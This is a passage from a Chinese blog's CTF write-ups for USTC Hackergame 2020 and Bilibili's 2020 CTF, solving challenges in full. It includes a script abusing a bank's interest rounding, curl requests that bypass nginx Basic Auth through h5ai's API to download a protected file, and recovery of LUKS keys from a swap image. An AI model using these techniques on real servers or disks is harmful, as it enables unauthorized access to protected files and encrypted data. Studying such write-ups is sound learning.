class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 